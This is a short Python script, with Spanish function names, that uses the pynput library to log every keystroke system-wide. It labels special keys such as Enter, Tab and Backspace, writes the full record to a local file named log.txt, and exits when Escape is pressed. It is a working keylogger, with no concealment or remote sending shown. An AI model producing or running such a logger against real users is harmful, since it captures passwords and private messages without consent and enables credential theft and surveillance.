from pynput.keyboard import Key, Listener

keys = []

def sr(key):
    try:
        return key.char
    except AttributeError:
        if key == Key.esc:
            return '[ESC]'
        elif key == Key.enter:
            return '[ENTER]'
        elif key == Key.tab:
            return '[TAB]'
        elif key == Key.space:
            return '[SPACE]'
        elif key == Key.backspace:
            return '[BACKSPACE]'
        elif key == Key.left:
            return '[LEFT ARROW]'
        elif key == Key.right:
            return '[RIGHT ARROW]'
        elif key == Key.up:
            return '[UP ARROW]'
        elif key == Key.down:
            return '[DOWN ARROW]'
        else:
            return f'[{key}]' 

def presionar_tecla(key):
    keys.append(key)
    convertir_string(keys)

def convertir_string(keys):
    with open('log.txt','w') as logfile:
        for key in keys:
            key_str = sr(key).replace("'", "")
            logfile.write(key_str)
            logfile.write('\n')
        
def soltar_tecla(key):
    if key == Key.esc:
        return False

with Listener(on_press = presionar_tecla, on_release = soltar_tecla) as listener:
    listener.join()